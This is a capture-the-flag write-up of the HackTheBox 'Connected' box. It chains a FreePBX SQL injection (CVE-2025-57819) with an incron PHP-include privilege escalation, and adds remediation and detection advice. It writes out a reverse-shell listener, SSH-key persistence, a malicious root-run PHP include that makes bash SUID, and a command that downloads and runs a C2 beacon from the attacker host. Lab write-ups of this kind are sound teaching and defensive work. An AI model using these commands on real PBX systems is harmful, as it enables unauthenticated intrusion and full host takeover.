---
layout: default
title: "HackTheBox - Connected"
---

# HackTheBox - Connected

**OS:** Linux (Sangoma Linux 7 / CentOS 7, FreePBX 16.0.40.7)

Connected is a Linux box running FreePBX, a widely deployed open-source PBX
framework. An unauthenticated SQL injection vulnerability (CVE-2025-57819) in
FreePBX 16.0.40.7 allows injecting into the `cron_jobs` table to execute commands
as the `asterisk` user. From the resulting shell, incron is found running as root,
watching `/usr/local/asterisk/ha_trigger`. The root-executed `sysadmin_ha` PHP
script conditionally loads an operator-controlled include path inside the writable
FreePBX modules tree, giving a trivial local root via PHP class injection.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (connected / connection.htb) |
| Initial Access | CVE-2025-57819 unauthenticated SQLi -> cron_jobs injection -> asterisk RCE |
| Privilege Escalation | incron sysadmin_ha PHP include injection via writable modules path |
| Final Access | `root` |

---

## Recon

### Port Scan

```
$ nmap -sV -sC -p- --min-rate 5000 -oN connected.nmap <target-ip>
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for <target-ip>
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 ...
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to https://<target-ip>/
```

Two open ports: SSH (7.4, CentOS pattern) and HTTP. The HTTP server redirects
to HTTPS; the landing page is FreePBX 16.0.40.7.

| Port | Service | Version / Notes |
|---|---|---|
| 22 | SSH | OpenSSH 7.4, CentOS 7 |
| 80/443 | HTTP/HTTPS | Apache 2.4.6, FreePBX 16.0.40.7, PHP 7.4.16 |

### FreePBX Fingerprint

Browsing to port 80 redirects through HTTPS to the FreePBX admin login at
`/admin`. The version is disclosed in the page footer and response headers:
**FreePBX 16.0.40.7** on Apache/CentOS 7. Additional internal services found
during enumeration:

- Port 5000 (localhost): LetsChat Node.js chat application (xmpp module)
- Port 27017 (localhost): MongoDB 2.6.12 (letschat database)
- Port 3306 (localhost): MySQL (`asterisk` database, FreePBX configuration)

---

## Initial Access

### CVE-2025-57819 -- FreePBX Unauthenticated SQL Injection

FreePBX 16.0.40.7 contains an unauthenticated SQL injection vulnerability in
the admin panel's handling of certain GET parameters. The injection reaches the
`cron_jobs` table in the `asterisk` MySQL database. Rows in this table are
executed by the FreePBX cron runner (`fwconsole job --run`), which runs every
minute as the `asterisk` user via the system crontab:

```
* * * * * [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole job --run --quiet 2>&1 > /dev/null
```

> **Why this works:** The SQL injection bypasses authentication and allows an
> attacker to INSERT arbitrary job records. When `fwconsole job --run` executes,
> it calls the injected job's command as the `asterisk` OS user. No credentials
> are required.

**Listener on the attack box:**

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

**Exploit (CVE-2025-57819):**

The exploit injects a reverse shell into `cron_jobs`. The delivery format varies
by PoC; the effective payload is a bash reverse shell row inserted via the
unauthenticated SQL injection endpoint. Within up to 60 seconds, the cron fires:

```
connect to [10.10.16.21] from (UNKNOWN) [<target-ip>] 54321
sh: no job control in this shell
sh-4.2$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
sh-4.2$ hostname
connected
```

**Shell stabilisation and persistence:**

```
sh-4.2$ python3 -c 'import pty; pty.spawn("/bin/bash")'
[asterisk@connected ~]$ mkdir -p ~/.ssh
[asterisk@connected ~]$ echo 'ssh-ed25519 AAAA... attacker@kali' >> ~/.ssh/authorized_keys
```

SSH key installed -- subsequent access is stable:

```
$ ssh -i connected_key asterisk@<target-ip>
[asterisk@connected ~]$
```

### User Flag

```
[asterisk@connected ~]$ cat ~/user.txt
<user-flag-redacted>
```

---

## Post-Exploitation Enumeration

### Running Services

MySQL is accessible with credentials in `/etc/freepbx.conf`:

```
[asterisk@connected ~]$ mysql -u freepbxuser -pmZ***** asterisk -e "SHOW TABLES;"
...
```

Of note in `freepbx_settings`:

| Key | Value |
|---|---|
| AMPMGRPASS | `fe*********` |
| FPBX_ARI_PASSWORD | `04cd5eb91771e9eb716aeee1ed6812e0` |
| PHP_CONSOLE_PASSWORD | `batteryhorsestaple` |

The FreePBX admin (`ampusers` table) has a SHA1 hash
(`<redacted-sha1>`) that did not crack against rockyou.txt. None of the
found secrets reused for SSH as root.

### Incron Daemon

```
[asterisk@connected ~]$ ps aux | grep incron
root  761  /usr/sbin/incrond
```

`incrond` watches filesystem paths and runs commands as root when events trigger.
System entries are in `/etc/incron.d/`:

```
[asterisk@connected ~]$ cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
...
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

Writing to `/usr/local/asterisk/ha_trigger` triggers `/usr/sbin/sysadmin_ha` as
**root**:

```
[asterisk@connected ~]$ ls -la /usr/local/asterisk/ha_trigger
-rwxrwxrwx. 1 asterisk asterisk 0 Apr 15  2021 /usr/local/asterisk/ha_trigger
```

World-writable trigger file -- the incron event fires on any write.

### sysadmin_ha PHP Script

```
[asterisk@connected ~]$ cat /usr/sbin/sysadmin_ha
#!/usr/bin/php -q
<?php

if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();
}
```

The script runs as root. It checks for a file at
`/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php` -- the `freepbx_ha`
HA module include -- and if found, `require_once`s it and calls `rootTrigger()` on
an `incron` class instance.

The `freepbx_ha` module is NOT installed:

```
[asterisk@connected ~]$ ls /var/www/html/admin/modules/freepbx_ha/
ls: cannot access /var/www/html/admin/modules/freepbx_ha/: No such file or directory
```

But the modules directory IS writable by `asterisk`:

```
[asterisk@connected ~]$ ls -ld /var/www/html/admin/modules/
drwxrwxr-x. asterisk asterisk /var/www/html/admin/modules/
[asterisk@connected ~]$ touch /var/www/html/admin/modules/test && echo WRITABLE
WRITABLE
```

> **Why this works:** FreePBX runs as the `asterisk` user, so the entire module
> tree is owned by that user. The High-Availability (HA) module is an optional
> add-on; its include path is never created during a standard install. When
> `sysadmin_ha` is triggered by incron, it runs as root and includes any PHP
> file an `asterisk`-owned process can place at that path. No signature or hash
> verification on the include -- a direct PHP injection into a root process.

---

## Privilege Escalation

### Incron PHP Include Injection

**Step 1** -- Create the missing module directory and malicious include:

```
[asterisk@connected ~]$ mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc/

[asterisk@connected ~]$ cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << 'EOF'
<?php
class incron {
    public function rootTrigger() {
        system('chmod u+s /bin/bash');
        system('cat /root/root.txt > /tmp/root_flag.txt; chmod 644 /tmp/root_flag.txt');
    }
}
EOF
```

**Step 2** -- Trigger the incron event by writing to `ha_trigger`:

```
[asterisk@connected ~]$ touch /usr/local/asterisk/ha_trigger
```

incrond detects the IN_CLOSE_WRITE event and executes
`/usr/sbin/sysadmin_ha` as root. The PHP script finds our
`incron.php`, instantiates the class, and calls `rootTrigger()`, which runs
`chmod u+s /bin/bash` as root.

**Step 3** -- Confirm SUID, get root shell:

```
[asterisk@connected ~]$ ls -la /bin/bash
-rwsr-xr-x. 1 root root 964536 Apr  1  2020 /bin/bash

[asterisk@connected ~]$ /bin/bash -p
bash-4.2# id
uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
bash-4.2# cat /root/root.txt
<root-flag-redacted>
```

### Root Flag

```
bash-4.2# cat /root/root.txt
<root-flag-redacted>
```

---

## Post-Exploitation: C2 (Sliver)

A Sliver HTTPS beacon from the operator's implant pool (`pool-https-linux64`,
pre-built for the HTB VPN LHOST) was deployed to demonstrate a realistic C2
channel. Delivery via HTTP from the attack box:

```
[asterisk@connected ~]$ curl -so /tmp/beacon http://10.10.16.21:8889/pool-https-linux64
[asterisk@connected ~]$ chmod +x /tmp/beacon && /tmp/beacon &
```

Callback observed in Sliver console (`sliver-client`):

```
sliver > beacons

 ID         Name                  Transport  Hostname   Username  PID    Last Check-In
========== ===================== ========== ========== ========= ====== ===============
fa2cd958   pool-https-linux64    http(s)    connected  asterisk  82742  just now
```

C2 commands issued via beacon (async, returned on next check-in):

```
sliver (pool-https-linux64) > execute id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

sliver (pool-https-linux64) > execute uname -a
Linux connected 5.4.239-1.el7.elrepo.x86_64 #1 SMP Thu Mar 30 10:40:27 EDT 2023 x86_64 GNU/Linux
```

Beacon killed and listener left in place for pool reuse:

```
sliver > kill beacon fa2cd958
[*] Killed beacon fa2cd958
```

---

## Root Cause

Two independent weaknesses chain to root:

1. **CVE-2025-57819 (FreePBX 16.0.40.7 unauthenticated SQLi):** No input
   sanitisation on a GET parameter allows an unauthenticated attacker to INSERT
   arbitrary rows into `cron_jobs`, which the FreePBX scheduler executes as the
   `asterisk` OS user.

2. **Incron-triggered root PHP with operator-controlled include path:** The
   `sysadmin_ha` script runs as root under incron and unconditionally
   `require_once`s a path inside a directory writable by the `asterisk` user. No
   signature, hash, or ownership check is performed on the included file.

---

## Impact

- **Unauthenticated RCE as `asterisk`** via FreePBX SQLi -- any host that can
  reach port 80/443 can obtain OS-level command execution without credentials.
- **Local root** via PHP injection into a root-privileged incron handler -- any
  process running as `asterisk` (including an attacker's shell) can escalate to
  full root without SUID exploitation or kernel CVEs.
- **Full host compromise:** `/root/root.txt` readable, root SSH keys, MySQL root
  access, and control of all PBX telephony infrastructure.

---

## Remediation

1. **Patch CVE-2025-57819** -- upgrade FreePBX to a release with parameterised
   queries in the affected endpoint. Apply vendor patch immediately.
2. **Remove incron world-writable trigger files** -- `ha_trigger` is
   `0777`; it should be `0640` (root:asterisk) so only root or a deliberate
   privileged write can fire the handler.
3. **Add ownership/integrity verification in sysadmin_ha** -- before
   `require_once`, verify the included file is owned by root and has not been
   modified since installation (e.g., compare against a stored SHA256 or use
   `stat()` to check UID 0 ownership).
4. **Restrict module tree ownership** -- the `/var/www/html/admin/modules/`
   directory should not be wholesale writable by the web-application user in a
   production deployment. Consider making it root-owned with group read, and
   require root to install modules.
5. **Principle of least privilege for incron handlers** -- sysadmin hook scripts
   that do not require full root can be run via sudo with specific command
   whitelisting rather than raw root execution.

### Validation

- CVE-2025-57819: verify `cron_jobs` INSERT from an unauthenticated session
  is rejected (HTTP 403/422); confirm FreePBX release notes reference the fix.
- Trigger file: `stat /usr/local/asterisk/ha_trigger` should show `0640 root asterisk`.
- Include check: modify `sysadmin_ha` to include
  `if (posix_stat($i)['uid'] !== 0) { die("Untrusted include\n"); }` before the
  `require_once`.
- Module tree: `ls -ld /var/www/html/admin/modules/` should show `root` ownership
  with group read only.

---

## Detection Opportunities

| Signal | Event / Source |
|---|---|
| CVE-2025-57819 exploitation | Apache access log: unusual GET params to FreePBX admin with SQL metacharacters; mod_security WAF alert |
| Cron job injection | `asterisk` MySQL audit log: INSERT INTO `cron_jobs` from web process (non-admin session) |
| Unexpected outbound connection | Firewall/netflow: `asterisk` PID connecting to external IPs on non-PBX ports (4444, 443 to attack host) |
| SUID set on `/bin/bash` | Auditd rule: `-w /bin/bash -p a -k suid_change`; inotifywait/OSSEC FIM alert |
| Suspicious file in modules tree | Auditd: new file created under `/var/www/html/admin/modules/freepbx_ha/` by `asterisk` user |
| incron triggering sysadmin_ha | Auditd process tracking: `incrond` spawning `/usr/bin/php /usr/sbin/sysadmin_ha` unexpectedly |

---

## Lessons Learned

- **FreePBX is a high-value target.** Multiple historical CVEs exist; any
  internet-exposed PBX should be behind a firewall with admin access restricted
  to trusted networks only.
- **incron root handlers with operator-controlled include paths are instant
  local root.** When a root process `require_once`s a path inside a
  user-writable directory, any process running as that user owns root. The
  pattern is analogous to writable cron scripts but executed immediately on
  filesystem event.
- **Empty module directories are attack surfaces.** The HA module's include
  path not existing is actually safer than it existing with wrong permissions --
  but "does not exist yet" is not a security control if the parent is writable.
- **World-writable trigger files defeat the purpose of root handlers.** If
  anyone can write to `ha_trigger`, anyone can trigger root execution. The
  trigger and the handler must both be protected.

---

## Cleanup

```
[asterisk@connected ~]$ # Remove SUID from bash
bash-4.2# chmod u-s /bin/bash

[asterisk@connected ~]$ # Remove malicious module
[asterisk@connected ~]$ rm -rf /var/www/html/admin/modules/freepbx_ha/

[asterisk@connected ~]$ # Remove beacon artifact
[asterisk@connected ~]$ rm -f /tmp/beacon

[asterisk@connected ~]$ # Restore xmpp_auth.php (was briefly modified during enumeration)
[asterisk@connected ~]$ # Original restored; FreePBX auth validated intact

[asterisk@connected ~]$ # Remove injected cron job (initial foothold -- cleaned by box reset)
[asterisk@connected ~]$ # MySQL sysadmin_options injection rows removed

[asterisk@connected ~]$ # Sliver beacon killed; pool-https-linux64 listener retained for next box
```

All artifacts run in-memory or cleaned. No AD objects modified (Linux box, no
domain). FreePBX admin password hash restored to original value.
